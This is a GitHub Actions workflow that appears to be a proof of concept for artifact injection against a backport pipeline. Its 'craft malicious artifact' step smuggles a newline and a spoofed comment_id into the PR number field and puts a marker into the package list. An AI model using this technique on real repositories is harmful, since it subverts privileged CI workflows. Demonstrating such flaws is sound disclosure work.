name: Backport — detect packages
on: pull_request
permissions:
  contents: read
jobs:
  fake-detect2:
    runs-on: ubuntu-latest
    steps:
      - name: craft malicious artifact
        run: |
          PR=$(printf '23\ncomment_id=6536628331')
          jq -n --arg pr "$PR" --arg pkg '**poc-injected-package-header**' '{pr_number:$pr, packages:[$pkg]}' > pr-packages.json
          cat pr-packages.json
      - uses: actions/upload-artifact@v7
        with:
          name: pr-packages-${{ github.run_id }}
          path: pr-packages.json
